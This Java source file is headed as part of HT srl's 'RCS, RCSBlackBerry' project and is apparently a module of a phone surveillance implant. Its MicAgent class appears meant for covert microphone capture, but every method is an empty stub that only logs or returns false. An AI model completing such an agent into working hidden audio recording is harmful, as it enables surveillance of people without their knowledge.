/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MicAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent.
 */
public final class MicAgent extends Agent {
    //#debug
    static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);

    /**
     * Instantiates a new mic agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MicAgent(final boolean agentStatus) {
        super(Agent.AGENT_MIC, agentStatus, true, "MicAgent");

    }

    /**
     * Instantiates a new mic agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
